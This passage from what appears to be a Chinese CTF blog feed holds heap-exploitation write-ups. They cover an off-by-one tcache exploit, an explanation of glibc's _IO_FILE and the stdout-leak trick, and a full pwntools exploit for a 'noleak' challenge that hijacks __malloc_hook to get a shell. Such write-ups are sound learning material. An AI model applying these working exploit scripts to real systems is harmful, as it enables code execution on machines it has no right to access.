punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span><span class="token comment"># constraints:</span><span class="token comment">#   rsp &amp; 0xf == 0</span><span class="token comment">#   rcx == NULL</span><span class="token comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span><span class="token comment"># constraints:</span><span class="token comment">#   [rsp+0x40] == NULL</span><span class="token comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span><span class="token comment"># constraints:</span><span class="token comment">#   [rsp+0x70] == NULL</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token operator">-</span>i<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xe0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x510</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>free_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#这里一直想不通为什么要再申请一个chunk才行，难道不能直接free 0两次吗</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE介绍以及stdout打法</title>
      <link href="/2023/03/19/IO-FILE%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Astdout%E6%89%93%E6%B3%95/"/>
      <url>/2023/03/19/IO-FILE%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Astdout%E6%89%93%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="IO-FLIE漏洞利用"><a href="#IO-FLIE漏洞利用" class="headerlink" title="IO_FLIE漏洞利用"></a>IO_FLIE漏洞利用</h2><hr><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。<br>IO_FILE结构如图：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>       <span class="token comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_file_flags</span> <span class="token expression">_flags</span></span>  <span class="token comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  <span class="token comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_ptr<span class="token punctuation">;</span>   <span class="token comment">/* Current read pointer */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_end<span class="token punctuation">;</span>   <span class="token comment">/* End of get area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_base<span class="token punctuation">;</span>  <span class="token comment">/* Start of putback+get area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_base<span class="token punctuation">;</span> <span class="token comment">/* Start of put area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_ptr<span class="token punctuation">;</span>  <span class="token comment">/* Current put pointer. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_end<span class="token punctuation">;</span>  <span class="token comment">/* End of put area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_base<span class="token punctuation">;</span>   <span class="token comment">/* Start of reserve area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_end<span class="token punctuation">;</span>    <span class="token comment">/* End of reserve area. */</span>  <span class="token comment">/* The following fields are used to support backing up and undo. */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment">/* Pointer to start of non-current get area. */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment">/* Pointer to first valid character of backup area */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment">/* Pointer to end of non-current get area. */</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span>  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>  <span class="token keyword">int</span> _blksize<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>  _IO_off_t _old_offset<span class="token punctuation">;</span> <span class="token comment">/* This used to be _offset but it's too small.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__HAVE_COLUMN</span> <span class="token comment">/* temporary */</span></span>  <span class="token comment">/* 1+column number of pbase(); 0 is unknown. */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/*  char* _save_gptr;  char* _save_egptr; */</span>  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_USE_OLD_IO_FILE</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_complete</span><span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> _file<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">defined _G_IO_IO_FILE_VERSION <span class="token operator">&amp;&amp;</span> _G_IO_IO_FILE_VERSION <span class="token operator">==</span> <span class="token number">0x20001</span></span></span>  _IO_off64_t _offset<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">if</span> <span class="token expression">defined _LIBC <span class="token operator">||</span> defined _GLIBCPP_USE_WCHAR_T</span></span>  <span class="token comment">/* Wide character stream stuff.  */</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span>_codecvt<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span>_wide_data<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_freeres_list<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>_freeres_buf<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">else</span></span>  <span class="token keyword">void</span> <span class="token operator">*</span>__pad1<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__pad2<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__pad3<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__pad4<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> __pad5<span class="token punctuation">;</span>  <span class="token keyword">int</span> _mode<span class="token punctuation">;</span>  <span class="token comment">/* Make sure we don't get into trouble again.  */</span>  <span class="token keyword">char</span> _unused2<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。<br>在标准 I&#x2F;O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。<br>通过观察可以看到file结构中的字段都是一些指针，这些指针包括输入的buf起始地址等等信息。<br>但是实际上，我们关注的内容并不只是file结构本身。<br>_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p><h3 id="vtable的作用"><a href="#vtable的作用" class="headerlink" title="vtable的作用"></a>vtable的作用</h3><hr><p>file结构外层是被一个更大的结构体包括，这个结构体除了file外，还有个vtable的指针当我们调用比如fread、fopen、fwrite等函数时，实际上会调用文件的vtable中的函数指针，如果我们劫持了这些函数指针，就可以劫持控制流。但是在某些情况下vtable是不可写的，但是我们可以劫持vtable指针，伪造一个vtable来达到攻击的目的。</p><h3 id="劫持stdout泄露libc地址"><a href="#劫持stdout泄露libc地址" class="headerlink" title="劫持stdout泄露libc地址"></a>劫持stdout泄露libc地址</h3><hr><p>主要思路就是修改stdout的flag位为<code>0xfbad1800</code>,并且将<code>_IO_write_base</code>的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。<br>为什么flag要改成<code>0xfbad1800</code>，看源码：<br><img src="/images/IO-FILE%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Astdout%E6%89%93%E6%B3%95/1.png"><br>最终需要构造的<code>fp-flags</code>是这样的，才能绕过上面提到的分支</p><p><img src="/images/IO-FILE%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Astdout%E6%89%93%E6%B3%95/2.png"></p><hr><h3 id="noleak-write-up"><a href="#noleak-write-up" class="headerlink" title="noleak write_up"></a>noleak write_up</h3><hr><p>题目：<a href="/download/noleak">noleak</a><br>环境：Ubuntu 16.04</p><hr><p>这题的漏洞和之前的offbyone是同一个，这里就不多说了。<br>做之前，我们看看一些要用的数据：<br><img src="/images/IO-FILE%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Astdout%E6%89%93%E6%B3%95/3.png"><br><img src="/images/IO-FILE%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Astdout%E6%89%93%E6%B3%95/4.png"><br><img src="/images/IO-FILE%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Astdout%E6%89%93%E6%B3%95/5.png"><br>可以找到目标位置附近的fake_chunk,我们的目标是利用unsortbin的fd、bk指针改为fake_chunk，ALSR不会随机化低3位这里25dd只有2是会随机化的，也就是暴力破解需要16次，我们有十六分之一的概率爆破成功，这里我关闭了ALSR，所以不用爆破。<br>这里我们直接上exp讲解：(这个exp是学长大大的，我觉得这个比老师讲得更简单特别多，借鉴一下)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./noleak'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'4:delete'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#chunk0用来改chunk1的头部size</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#chunk 1、2、3用来合并</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#chunk4防止与topchunk合并</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span><span class="token string">'\xe1\x01'</span><span class="token punctuation">)</span><span class="token comment">#更改chunk1的size使他刚好覆盖到chunk3的末尾</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#先2、3再1才会触发合并，构造overlap</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token comment">#先将chunk1申请出来，由于会链入、切割、链出，会在剩下的chunk生成fd、bk，剩下的是与两个fastbin重叠的chunk</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token string">'\xdd\x25'</span><span class="token punctuation">)</span><span class="token comment">#这里申请的chunk大小只要不要超过0xd8都可以，更改unsortbin留下的fd的低字节</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token operator">+</span><span class="token string">b'\x71'</span><span class="token punctuation">)</span><span class="token comment">#要将未分配的unsortbin堆头size改为0x71用于分配，躲避检查</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#unsortbin的指针存储在chunk2里，而且上面先free的chunk2，也就是chunk2位于链尾</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#连续申请3次可得到fake_chunk，0x33在上面图中有计算，就是0x43-堆头0x10</span>                                                      <span class="token comment">#后面几个参数没用，设置为0</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  libc_base<span class="token operator">=</span>leak<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">192</span> <span class="token comment">#偏移是固定的</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>realloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4527a</span>fake_chunk<span class="token operator">=</span>malloc_hook<span class="token operator">-</span><span class="token number">0x23</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#重新构造堆块重叠，获得edit功能，具体看上一篇文章</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span><span class="token string">'\xe1'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token string">'12'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞偏移的便捷算法</title>
      <link href="/2023/03/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%81%8F%E7%A7%BB%E7%9A%84%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
      <url>/2023/03/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%81%8F%E7%A7%BB%E7%9A%84%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/</url>
      
